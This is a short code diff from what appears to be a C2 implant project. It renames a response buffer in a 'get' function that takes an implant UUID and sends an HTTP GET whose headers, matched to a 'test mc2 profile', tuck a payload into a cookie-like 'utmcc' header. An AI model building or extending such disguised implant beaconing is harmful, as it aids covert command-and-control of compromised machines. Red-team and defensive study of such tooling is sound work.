@@ -9,7 +9,7 @@
 int get(std::string implant_uuid) {
     //note, pass a copy of implant_uuid in, as we are going to be potentialyl heavily editing it. 
 
-    std::vector<char> responseBuffer;
+    std::vector<uint8_t> http_response_buffer;
 
     //[TEMPLATE ME] //temp use of headers, matching test mc2 profile. 
     // Define headers (No \r\n needed)
@@ -36,8 +36,8 @@ int get(std::string implant_uuid) {
     L"utmcc: " + std::wstring(payload.begin(), payload.end())
     };
 
-    if (HTTP_GET(headers, responseBuffer)) {
-        std::cout << "Success! Bytes read: " << responseBuffer.size() << std::endl;
+    if (HTTP_GET(headers, http_response_buffer)) {
+        std::cout << "Success! Bytes read: " << http_response_buffer.size() << std::endl;
     }
     else {
         std::cerr << "Request failed." << std::endl;
